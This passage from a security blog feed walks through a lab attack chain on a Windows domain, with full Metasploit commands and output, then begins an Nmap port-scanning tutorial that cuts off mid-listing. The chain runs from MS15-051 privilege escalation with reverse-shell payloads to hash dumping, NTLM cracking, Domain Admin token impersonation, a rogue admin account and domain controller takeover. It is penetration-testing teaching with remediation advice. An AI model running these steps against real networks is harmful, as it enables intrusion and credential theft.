&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1708
[*] Migrating from 1992 to 1708...
[*] Migration completed successfully.
meterpreter &amp;gt; sysinfo 
Computer        : WIN7SP164
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : NET
Logged On Users : 2
Meterpreter     : x64/win64
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The main concern now is that, even if we are able to read and write files inside the contest of the current user “testuser1”, we want to acquire a privileged access to the machine, i.e. we want to gain Administrator rights.&lt;br /&gt;
For this purpose we can analyze what Security patches are installed on the system in order to find if there are unpatched privilege escalation vulnerabilities. By doing this we can drop down to a Windows command shell and use the “wmic” utility:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; shell
Process 1880 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&amp;gt;wmic qfe list 
wmic qfe list
Caption                                        CSName     Description  FixComments  HotFixID  InstallDate  InstalledBy              InstalledOn  Name  ServicePackInEffect  Status  
http://go.microsoft.com/fwlink/?LinkId=161784  WIN7SP164  Update                    KB971033               NT AUTHORITY\SYSTEM      9/1/2016                                        
http://support.microsoft.com/?kbid=976902      WIN7SP164  Update                    KB976902               win7sp164\Administrator  11/21/2010

C:\Windows\system32&amp;gt;^C
Terminate channel 1? [y/N]  y
meterpreter &amp;gt; background 
[*] Backgrounding session 1...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The output shows clearly that in this company Windows System Administrators are not frequently updating clients workstations.&lt;br /&gt;
For example, we have discovered that the KB to the MS15-051 vulnerability is missing, so we can exploit it. This vulnerability affects Windows Kernel-Mode drivers allowing RCE, so it is possible to perform a Local Privilege Escalation, i.e. we can elevate the rights of our meterpreter session, which runs with “testuser1” privileges, to NT AUTHORITY\SYSTEM:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(java_storeimagearray) &amp;gt; use exploit/windows/local/ms15_051_client_copy_image 
msf exploit(ms15_051_client_copy_image) &amp;gt; info

       Name: Windows ClientCopyImage Win32k Exploit
     Module: exploit/windows/local/ms15_051_client_copy_image
   Platform: Windows
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2015-05-12

Provided by:
  Unknown
  hfirefox
  OJ Reeves
  Spencer McIntyre

Available targets:
  Id  Name
  --  ----
  0   Windows x86
  1   Windows x64

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION                   yes       The session to run this module on.

Payload information:
  Space: 4096

Description:
  This module exploits improper object handling in the win32k.sys 
  kernel mode driver. This module has been tested on vulnerable builds 
  of Windows 7 x64 and x86, and Windows 2008 R2 SP1 x64.

References:
  http://cvedetails.com/cve/2015-1701/
  http://technet.microsoft.com/en-us/security/bulletin/MS15-051
  https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html
  https://github.com/hfiref0x/CVE-2015-1701
  https://technet.microsoft.com/library/security/MS15-051
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;To run this module we just need to set the session on which we want to run the module on and the payload type:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(ms15_051_client_copy_image) &amp;gt; set session 1 
session =&amp;gt; 1
msf exploit(ms15_051_client_copy_image) &amp;gt; set target 1
target =&amp;gt; 1
msf exploit(ms15_051_client_copy_image) &amp;gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&amp;gt; windows/x64/meterpreter/reverse_tcp
msf exploit(ms15_051_client_copy_image) &amp;gt; set lhost 192.168.1.10
lhost =&amp;gt; 192.168.1.10
msf exploit(ms15_051_client_copy_image) &amp;gt; show options 

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
   LHOST     192.168.1.10     yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows x64

msf exploit(ms15_051_client_copy_image) &amp;gt; exploit
[*] Started reverse TCP handler on 192.168.1.10:4444 
[*] Launching notepad to host the exploit...
[+] Process 2856 launched.
[*] Reflectively injecting the exploit DLL into 2856...
[*] Injecting exploit into 2856...
[*] Exploit injected. Injecting payload into 2856...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (1189423 bytes) to 192.168.1.208
[*] Meterpreter session 2 opened (192.168.1.10:4444 -&amp;gt; 192.168.1.208:49164) at 2016-11-16 20:45:29 +0200
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The newly created session has elevated privileges:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter &amp;gt; background 
[*] Backgrounding session 2...
msf exploit(ms15_051_client_copy_image) &amp;gt; sessions -l

Active sessions
===============

  Id  Type                   Information                      Connection
  --  ----                   -----------                      ----------
  1   meterpreter x64/win64  NET\testuser1 @ WIN7SP164        192.168.1.10:443 -&amp;gt; 192.168.1.208:49326 (192.168.1.208)
  2   meterpreter x64/win64  NT AUTHORITY\SYSTEM @ WIN7SP164  192.168.1.10:4444 -&amp;gt; 192.168.1.208:49327 (192.168.1.208)

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This means now we have full control on the compromised system, like having access to the local stored credentials:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(ms15_051_client_copy_image) &amp;gt; use post/windows/gather/credentials/credential_collector 
msf post(credential_collector) &amp;gt; info

       Name: Windows Gather Credential Collector
     Module: post/windows/gather/credentials/credential_collector
   Platform: Windows
       Arch: 
       Rank: Normal

Provided by:
  tebo &amp;lt;tebo@attackresearch.com&amp;gt;

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION                   yes       The session to run this module on.

Description:
  This module harvests credentials found on the host and stores them 
  in the database.

msf post(credential_collector) &amp;gt; set session 2
session =&amp;gt; 2
msf post(credential_collector) &amp;gt; exploit 
[*] Running module against WIN7SP164
[+] Collecting hashes...
    Extracted: Administrator:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef
    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
    Extracted: test:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
[+] Collecting tokens...
    NET\testuser1
    NT AUTHORITY\LOCAL SERVICE
    NT AUTHORITY\NETWORK SERVICE
    NT AUTHORITY\SYSTEM
    NT AUTHORITY\ANONYMOUS LOGON
    [*] Post module execution completed
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This module stores gathered credential in Metasploit database so it is possible to display them with a simple command:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf post(credential_collector) &amp;gt; creds
Credentials
===========

host           origin         service        public         private                                                            realm  private_type
----           ------         -------        ------         -------                                                            -----  ------------
192.168.1.208  192.168.1.208  445/tcp (smb)  Administrator  aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef         NTLM hash
192.168.1.208  192.168.1.208  445/tcp (smb)  Guest          aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash
192.168.1.208  192.168.1.208  445/tcp (smb)  test           aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c         NTLM hash
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;NTLM hash cracking&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Analyzing collected credentials we find the following fields: a username and two strings separated by the colon symbol; these two represent the encrypted password for that user.&lt;br /&gt;
Windows credentials are stored using hashing algorithms: the first part of the hash represents the LAN Manager (LM) hash. The LM authentication protocol has been disabled by default starting from Windows Vista and Windows Server 2008 since it was really unsecure; this is why the string “aad3b435b51404eeaad3b435b51404ee” represents an empty value (remember we are on a Windows 7 machine).&lt;br /&gt;
The second part represents the NT LAN Manager (NTLM) hash: NTLM is the successor of the LM protocol, but it is still vulnerable to password cracking attacks. This is why we can use the password cracking tool &lt;em&gt;John The Ripper&lt;/em&gt; in dictionary attack mode to find the corresponding plain text password.&lt;/p&gt;

&lt;p&gt;Since NTLM hashing function is well known it is possible to compute in advance for a given word the corresponding hash; moreover it is symmetric so we have a one-to-one correspondence betweeen words and hashes. So, defining &lt;em&gt;f&lt;/em&gt; as the hashing function and &lt;em&gt;x&lt;/em&gt; as the plain text password, we have that &lt;em&gt;y = f(x)&lt;/em&gt; returns the computed hash.&lt;/p&gt;

&lt;p&gt;A dictionary attack works in a simple way: we have a file with a list of words (this is why these files can be found under the name of “wordlists”); for each word we generate the corresponding NTLM hash and then we compare it with the one we want to crack. Once we find the one that matches, we are sure we have found the password.&lt;/p&gt;

&lt;p&gt;It is always a good idea to start with a dictionary attack instead of a brute force attack, since generally people set common words as their password and in that case we can accomplish our task pretty rapidly.&lt;/p&gt;

&lt;p&gt;We are interested in the Administrator account, so we start by saving its details, i.e. username and corresponding NTLM hash, in a text file:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# cat hashes.txt 
Administrator:5835048ce94ad0564e29a924a03510ef
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Then we can launch the tool by specifying the hashes format and the dictionary file we want to use to crack the hashes (“rockyou” wordlist is included by default in Kali Linux inside &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists&lt;/code&gt; folder):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# john --format=NT --wordlist=/root/dictionary/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 SSE2 4x3])
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
password1        (Administrator)
1g 0:00:00:00 DONE (2016-09-03 23:09) 25.00g/s 900.0p/s 900.0c/s 900.0C/s tigger..liverpool
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;JTR has successfully found the password for the Administrator account: “password1”.
Considering the worst case for the attacker, we suppose that the local Administrator password is different in every client belonging to the domain (otherwise he would already had access to every machine without performing any further action).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Token Impersonation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this case there are different ways to move on; for example we can proceed by using a technique called “Token Stealing” or “Token Impersonation”.&lt;br /&gt;
In Windows, everytime a user tries to log in, the system verifies that user’s password is correct by matching it with the one stored in the Security database: this is called “authentication process”. When the process succeed, the system generates an access token. Tokens can be seen as a temporary key so every process executed in the context of that user does not need to request the password again to run with user’s privileges: these are called “Delegation Tokens” and they persist on the system until next reboot. In fact, a user log off does not invalidate the token, but the token itself will be reported as an impersonation token instead of a delegation one.&lt;/p&gt;

&lt;p&gt;If a user connect to the compromised machine, it is possible to steal its relative token. This task can be performed with a Metasploit extension called Incognito.&lt;br /&gt;
Taking a look at the output of the “credential_collector” module used before, we see there are reported also informations about tokens. Now, supposing a Domain Admin logs on the controlled machine, we should see a delegation token for that user from the &lt;code class=&quot;highlighter-rouge&quot;&gt;list_tokens&lt;/code&gt; command part of Incognito extension:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(credential_collector) &amp;gt; sessions -i 2
[*] Starting interaction with 2...

meterpreter &amp;gt; load incognito 
Loading extension incognito...success.

meterpreter &amp;gt; list_tokens -u

Delegation Tokens Available
========================================
NET\boss
NET\testuser1
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;A new delegation token appears for the user “boss”, which is, as enumerated before, a Domain Admin. We can try to impersonate that token to acquire user privileges:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; impersonate_token
Usage: impersonate_token &amp;lt;token&amp;gt;

Instructs the meterpreter thread to impersonate the specified token. All other actions will then be made in the context of that token.

Hint: Double backslash DOMAIN\\name (meterpreter quirk)
Hint: Enclose with quotation marks if name contains a space

meterpreter &amp;gt; impersonate_token NET\\boss
[+] Delegation token available
[+] Successfully impersonated user NET\boss
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;A successful impersonation message is returned. Dropping down to a Windows shell we can check our identification:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; shell
Process 888 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&amp;gt;whoami
whoami
net\boss
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Impersonating a Domain Admin gives the rights to do pretty much whatever we want; for example we can add users to AD:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Windows\system32&amp;gt;net user evilboss password123 /add /domain
net user evilboss password123 /add /domain
The request will be processed at a domain controller for domain net.testlab.

The command completed successfully.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In particular, we can give Domain Admin rights to the just created user “evilboss”:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Windows\system32&amp;gt;net group &quot;Domain Admins&quot; evilboss /add /domain
net group &quot;Domain Admins&quot; evilboss /add /domain
The request will be processed at a domain controller for domain net.testlab.

The command completed successfully.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Now we have our own Domain Admin user through which we have administrative access to every machine registered to the Domain; that said, a good target is represented by the Domain Controller which stores all domain users NTLM hashes.
To log on the DC we can use the “psexec” module:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Windows\system32&amp;gt;^C
Terminate channel 1? [y/N]  y
meterpreter &amp;gt; background 
[*] Backgrounding session 2...
msf exploit(credential_collector) &amp;gt; use exploit/windows/smb/psexec
msf exploit(psexec) &amp;gt; info

       Name: Microsoft Windows Authenticated User Code Execution
     Module: exploit/windows/smb/psexec
   Platform: Windows
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Manual
  Disclosed: 1999-01-01

Provided by:
  hdm &amp;lt;x@hdm.io&amp;gt;
  Royce Davis &amp;lt;rdavis@accuvant.com&amp;gt;
  RageLtMan &amp;lt;rageltman@sempervictus&amp;gt;

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   PowerShell
  2   Native upload
  3   MOF upload

Basic options:
  Name                  Current Setting  Required  Description
  ----                  ---------------  --------  -----------
  RHOST                                  yes       The target address
  RPORT                 445              yes       The SMB service port
  SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
  SERVICE_DISPLAY_NAME                   no        The service display name
  SERVICE_NAME                           no        The service name
  SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
  SMBDomain             .                no        The Windows domain to use for authentication
  SMBPass                                no        The password for the specified username
  SMBUser                                no        The username to authenticate as

Payload information:
  Space: 3072

Description:
  This module uses a valid administrator username and password (or 
  password hash) to execute an arbitrary payload. This module is 
  similar to the &quot;psexec&quot; utility provided by SysInternals. This 
  module is now able to clean up after itself. The service created by 
  this tool uses a randomly chosen name and description.

References:
  http://cvedetails.com/cve/1999-0504/
  http://www.osvdb.org/3106
  http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx
  http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access
  http://sourceforge.net/projects/smbexec/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This module takes as inputs the Domain name, a valid administrator username and password (no matter if plain text or hashed) and the destination host we want to log in. It connects to the Samba share specified on the target machine.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(psexec) &amp;gt; set target 1
target =&amp;gt; 1
msf exploit(psexec) &amp;gt; set rhost 192.168.1.200
rhost =&amp;gt; 192.168.1.200
msf exploit(psexec) &amp;gt; set SMBDomain NET
SMBDomain =&amp;gt; NET
msf exploit(psexec) &amp;gt; set SMBUser evilboss
SMBUser =&amp;gt; evilboss
msf exploit(psexec) &amp;gt; set SMBPass password123
SMBPass =&amp;gt; password123
msf exploit(psexec) &amp;gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&amp;gt; windows/x64/meterpreter/reverse_tcp
msf exploit(psexec) &amp;gt; set lhost 192.168.1.10
lhost =&amp;gt; 192.168.1.10
msf exploit(psexec) &amp;gt; set lport 4445
lport =&amp;gt; 4445
msf exploit(psexec) &amp;gt; exploit -j

[*] Started reverse TCP handler on 192.168.1.10:4445 
[*] 192.168.1.200:445 - Connecting to the server...
[*] 192.168.1.200:445 - Authenticating to 192.168.1.200:445|NET as user &#39;evilboss&#39;...
[*] 192.168.1.200:445 - Executing the payload...
[+] 192.168.1.200:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (957999 bytes) to 192.168.1.200
[*] Meterpreter session 3 opened (192.168.1.10:4445 -&amp;gt; 192.168.1.200:49245) at 2016-11-16 20:58:18 +0200

msf exploit(psexec) &amp;gt; sessions -l

Active sessions
===============

  Id  Type                   Information                      Connection
  --  ----                   -----------                      ----------
  1   meterpreter x64/win64  NET\testuser1 @ WIN7SP164        192.168.1.10:443 -&amp;gt; 192.168.1.208:49163 (192.168.1.208)
  2   meterpreter x64/win64  NT AUTHORITY\SYSTEM @ WIN7SP164  192.168.1.10:4444 -&amp;gt; 192.168.1.208:49164 (192.168.1.208)
  4   meterpreter x64/win64  NT AUTHORITY\SYSTEM @ DC         192.168.1.10:4445 -&amp;gt; 192.168.1.200:49388 (192.168.1.200)

meterpreter &amp;gt; sysinfo 
Computer        : DC
OS              : Windows 2012 R2 (Build 9600).
Architecture    : x64
System Language : en_US
Domain          : NET
Logged On Users : 5
Meterpreter     : x64/win64
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Finally we can dump all the credentials stored on the Domain Controller:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4b08728132d41e230b4ee268c5b42acb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43a6a9669d444da03408e368b8daf0c1:::
DC:1001:aad3b435b51404eeaad3b435b51404ee:4b08728132d41e230b4ee268c5b42acb:::
boss:1108:aad3b435b51404eeaad3b435b51404ee:c1fc37edabedb382c5141e88ce614b11:::
testuser2:1109:aad3b435b51404eeaad3b435b51404ee:f984c0e85e62faef91f6ad49fb9f8554:::
testuser1:1110:aad3b435b51404eeaad3b435b51404ee:b4c295164ce915935084495caf7f9cfa:::
evilboss:1119:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
DC$:1002:aad3b435b51404eeaad3b435b51404ee:a2807c6834bac0c8599530a02aa169af:::
WIN7SP0$:1107:aad3b435b51404eeaad3b435b51404ee:77b40b8cb3d6c4547ab3442ff3a34683:::
WIN7SP1$:1115:aad3b435b51404eeaad3b435b51404ee:b31785870dd8c4df04ff8f48dd0b9728:::
WINXPSP2$:1116:aad3b435b51404eeaad3b435b51404ee:61083f3aff10e03cc6ece1b04c9a76f1:::
WIN7SP164$:1117:aad3b435b51404eeaad3b435b51404ee:031b3d01c20cb5f1ad6cceb4bccbd0ca:::
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Similarly to what we did for Local Administrator password, we can use JTR to crack this NTLM hashes.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Remediation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This article has shown how much it is important to keep systems up to date; by doing this it is important to take care not only about Operating System Security patches, but also about the software installed on it.&lt;/p&gt;

&lt;p&gt;Referring to this particular article scenario, the actions needed to secure the system are reported below:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Update Java to the latest version released so as to get rid of the CVE-2013-2465 and othere Java related vulnerabilities;&lt;/li&gt;
  &lt;li&gt;Install Microsoft Security patch KB3057191 in order to remove MS15-051 vulnerability.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Regarding Microsoft Windows access control model based on tokens, keep in mind that this is how Windows handles the authentication so it cannot be considered a vulnerability. This means that in order to secure the environment the countermeasures are more about processes and procedures. This is why it is important to follow Security best practices; here is a list of Security rules it is good to follow to lower the risk level related to token impersonation attacks:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Limit number of Domain Admin accounts&lt;/li&gt;
  &lt;li&gt;Users with Domain Admin account must use their unprivileged account for standard use;&lt;/li&gt;
  &lt;li&gt;Create administrative groups with access restricted to their competence area (for example, development, test and production groups) so as to limit possible data breaches.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication&quot;&gt;https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 17 Nov 2016 00:00:00 +0100</pubDate>
        <link>https://spreadsecurity.github.io//2016/11/17/attack-simulation-from-no-access-to-domain-admin.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/11/17/attack-simulation-from-no-access-to-domain-admin.html</guid>
        
        <category>Attack simulation</category>
        
        <category>Penetration testing</category>
        
        <category>Active Directory</category>
        
        <category>Domain Admin</category>
        
        <category>Java vulnerability</category>
        
        <category>Privilege escalation</category>
        
        <category>Exploitation</category>
        
        <category>Metasploit</category>
        
        <category>Incognito</category>
        
        <category>Token impersonation</category>
        
        <category>John The Ripper</category>
        
        <category>Password cracking</category>
        
        
      </item>
    
      <item>
        <title>Port Scanning with Nmap</title>
        <description>&lt;p&gt;Port scanning is a technique used to identify if a port on the target host is open or closed; a port can be open if there is a service that uses that specific port to communicate with other systems. This is the reason why if a port is open it is possible to eventually identify what kind of service uses it by sending specially crafted packets to the target.&lt;br /&gt;
This activity represents an important step in the active reconnaissance phase.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;strong&gt;Setting up a testing environment&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Since we need a target against which we can launch our port scanning attacks, we need to create a very basic testing laboratory that includes our attacking machine, in my case Kali Linux, and a target machine: for this lab session I suggest to download a VM called Metasploitable 2. This system, created by Metasploit team, has been build intentionally vulnerable to a series of attacks by exposing compromised services through open ports.&lt;br /&gt;
The virtual machine can be downloaded for free from &lt;a href=&quot;https://sourceforge.net/projects/metasploitable/files/Metasploitable2/&quot;&gt;here&lt;/a&gt;; because of its nature, do not expose this VM on the Internet, i.e. be sure to run it in a local network environment behind a Router Firewall.&lt;/p&gt;

&lt;p&gt;Once the VM image is downloaded it is just a matter of extracting the files from the archive and import it in your Hypervisor: for example, in VMware Workstation Player click on “Open a Virtual Machine”, select the extracted Metasploitable 2 image and you are ready to launch it. If everything has been done correctly you should get this terminal prompt:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/port_scanning/metasploitable2.png&quot;&gt;&lt;img src=&quot;/images/port_scanning/metasploitable2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Remember to configure it so as its IP address is in the same LAN of the attacking machine (in my case the LAN is 192.168.1.0/24).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Port scanning Metasploitable 2&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Nmap, which we have already analyzed for Network Discovery in &lt;a href=&quot;https://spreadsecurity.github.io/2016/09/25/network-discovery-with-nmap-and-netdiscover.html&quot;&gt;this&lt;/a&gt; topic, is the most famous tool for port scanning: by sending probes to the target it is able to find which ports are open and which services are running on them (this is just one of its capabilities).&lt;/p&gt;

&lt;p&gt;We can start by taking a look at the huge list of scanning options:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags &amp;lt;flags&amp;gt;: Customize TCP scan flags
  -sI &amp;lt;zombie host[:probeport]&amp;gt;: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b &amp;lt;FTP relay host&amp;gt;: FTP bounce scan
PORT SPECIFICATION AND SCAN ORDER:
  -p &amp;lt;port ranges&amp;gt;: Only scan specified ports
    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
  --exclude-ports &amp;lt;port ranges&amp;gt;: Exclude the specified ports from scanning
  -F: Fast mode - Scan fewer ports than the default scan
  -r: Scan ports consecutively - don&#39;t randomize
  --top-ports &amp;lt;number&amp;gt;: Scan &amp;lt;number&amp;gt; most common ports
  --port-ratio &amp;lt;ratio&amp;gt;: Scan ports more common than &amp;lt;ratio&amp;gt;
SERVICE/VERSION DETECTION:
  -sV: Probe open ports to determine service/version info
  --version-intensity &amp;lt;level&amp;gt;: Set from 0 (light) to 9 (try all probes)
  --version-light: Limit to most likely probes (intensity 2)
  --version-all: Try every single probe (intensity 9)
  --version-trace: Show detailed version scan activity (for debugging)
SCRIPT SCAN:
  -sC: equivalent to --script=default
  --script=&amp;lt;Lua scripts&amp;gt;: &amp;lt;Lua scripts&amp;gt; is a comma separated list of
           directories, script-files or script-categories
  --script-args=&amp;lt;n1=v1,[n2=v2,...]&amp;gt;: provide arguments to scripts
  --script-args-file=filename: provide NSE script args in a file
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
  --script-help=&amp;lt;Lua scripts&amp;gt;: Show help about scripts.
           &amp;lt;Lua scripts&amp;gt; is a comma-separated list of script-files or
           script-categories.
OS DETECTION:
  -O: Enable OS detection
  --osscan-limit: Limit OS detection to promising targets
  --osscan-guess: Guess OS more aggressively
TIMING AND PERFORMANCE:
  Options which take &amp;lt;time&amp;gt; are in seconds, or append &#39;ms&#39; (milliseconds),
  &#39;s&#39; (seconds), &#39;m&#39; (minutes), or &#39;h&#39; (hours) to the value (e.g. 30m).
  -T&amp;lt;0-5&amp;gt;: Set timing template (higher is faster)
  --min-hostgroup/max-hostgroup &amp;lt;size&amp;gt;: Parallel host scan group sizes
  --min-parallelism/max-parallelism &amp;lt;numprobes&amp;gt;: Probe parallelization
  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &amp;lt;time&amp;gt;: Specifies
      probe round trip time.
  --max-retries &amp;lt;tries&amp;gt;: Caps number of port scan probe retransmissions.
  --host-timeout &amp;lt;time&amp;gt;: Give up on target after this long
  --scan-delay/--max-scan-delay &amp;lt;time&amp;gt;: Adjust delay between probes
  --min-rate &amp;lt;number&amp;gt;: Send packets no slower than &amp;lt;number&amp;gt; per second
  --max-rate &amp;lt;number&amp;gt;: Send packets no faster than &amp;lt;number&amp;gt; per second
FIREWALL/IDS EVASION AND SPOOFING:
  -f; --mtu &amp;lt;val&amp;gt;: fragment packets (optionally w/given MTU)
  -D &amp;lt;decoy1,decoy2[,ME],...&amp;gt;: Cloak a scan with decoys
  -S &amp;lt;IP_Address&amp;gt;: Spoof source address
  -e &amp;lt;iface&amp;gt;: Use specified interface
  -g/--source-port &amp;lt;portnum&amp;gt;: Use given port number
